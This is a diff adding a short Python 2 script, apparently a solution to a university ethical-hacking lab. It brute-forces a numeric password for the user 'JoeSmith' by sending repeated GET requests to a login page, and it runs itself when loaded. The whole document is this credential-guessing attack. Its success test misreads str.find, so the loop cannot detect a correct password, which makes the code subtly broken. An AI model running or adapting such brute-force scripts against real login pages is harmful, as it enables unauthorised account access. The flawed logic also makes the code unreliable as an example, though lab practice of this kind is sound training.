@@ -1,0 +1,16 @@
+import requests
+
+def crackHouse():
+    """Bruteforce the password for titanium house"""
+
+    for item in range(999):
+        params = {"username":"JoeSmith", "password":item}
+        r = requests.get("http://creative.coventry.ac.uk/eh/web_ch4/welcome.php",
+                         params = params)
+        if r.text.find("incorrect"):
+            print "Fails on {0}".format(item)
+        else:
+            print "Passcode {0} Ok".format(item)
+            return item
+            
+crackHouse()
